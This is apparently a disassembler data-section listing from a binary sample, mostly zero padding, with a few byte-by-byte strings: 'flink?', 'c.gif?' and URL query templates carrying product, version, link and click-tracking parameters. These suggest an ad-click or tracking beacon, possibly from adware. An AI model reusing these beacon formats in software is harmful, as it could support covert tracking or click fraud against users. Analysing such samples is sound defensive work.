                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  76h ; v
                db  65h ; e
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  72h ; r
                db  69h ; i
                db  64h ; d
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  71h ; q
                db  37h ; 7
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  69h ; i
                db  3Dh ; =
                db  31h ; 1
                db  33h ; 3
                db  30h ; 0
                db  62h ; b
                db  35h ; 5
                db  31h ; 1
                db  65h ; e
                db  37h ; 7
                db  64h ; d
                db  63h ; c
                db  37h ; 7
                db  26h ; &
                db  70h ; p
                db  72h ; r
                db  64h ; d
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Dh ; m
                db  62h ; b
                db  3Dh ; =
                db  33h ; 3
                db  32h ; 2
                db  34h ; 4
                db  2Eh ; .
                db  31h ; 1
                db  32h ; 2
                db  66h ; f
                db  36h ; 6
                db  63h ; c
                db  66h ; f
                db  35h ; 5
                db  39h ; 9
                db  33h ; 3
                db  36h ; 6
                db  65h ; e
                db  26h ; &
                db  70h ; p
                db  76h ; v
                db  65h ; e
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  61h ; a
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Ah ; j
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  66h ; f
                db  3Dh ; =
                db  31h ; 1
                db  30h ; 0
                db  26h ; &
                db  72h ; r
                db  69h ; i
                db  64h ; d
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  63h ; c
                db  6Bh ; k
                db  3Dh ; =
                db  30h ; 0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aFlink          db 'flink?',0           ; DATA XREF: sub_404110+13↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ch ; l
                db  69h ; i
                db  6Eh ; n
                db  6Bh ; k
                db  64h ; d
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db  6Ch ; l
                db  63h ; c
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  62h ; b
                db  6Ch ; l
                db  61h ; a
                db  63h ; c
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  70h ; p
                db  64h ; d
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  75h ; u
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  71h ; q
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  75h ; u
                db  73h ; s
                db  65h ; e
                db  72h ; r
                db  3Dh ; =
                db  41h ; A
                db  46h ; F
                db  50h ; P
                db  36h ; 6
                db  5Fh ; _
                db  66h ; f
                db  6Fh ; o
                db  72h ; r
                db  5Fh ; _
                db  53h ; S
                db  49h ; I
                db  4Eh ; N
                db  7Ch ; |
                db  43h ; C
                db  50h ; P
                db  4Dh ; M
                db  41h ; A
                db  44h ; D
                db  7Ch ; |
                db  32h ; 2
                db  30h ; 0
                db  31h ; 1
                db  31h ; 1
                db  5Fh ; _
                db  68h ; h
                db  6Fh ; o
                db  6Dh ; m
                db  65h ; e
                db  26h ; &
                db  6Ch ; l
                db  69h ; i
                db  6Eh ; n
                db  6Bh ; k
                db  64h ; d
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  64h ; d
                db  62h ; b
                db  3Dh ; =
                db  73h ; s
                db  69h ; i
                db  6Eh ; n
                db  26h ; &
                db  63h ; c
                db  6Ch ; l
                db  63h ; c
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  62h ; b
                db  6Fh ; o
                db  72h ; r
                db  64h ; d
                db  65h ; e
                db  72h ; r
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  62h ; b
                db  6Ch ; l
                db  61h ; a
                db  63h ; c
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Ch ; l
                db  6Fh ; o
                db  63h ; c
                db  61h ; a
                db  6Ch ; l
                db  3Dh ; =
                db  79h ; y
                db  65h ; e
                db  73h ; s
                db  26h ; &
                db  70h ; p
                db  70h ; p
                db  64h ; d
                db  73h ; s
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aCGif           db 'c.gif?',0           ; DATA XREF: sub_404110+25↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
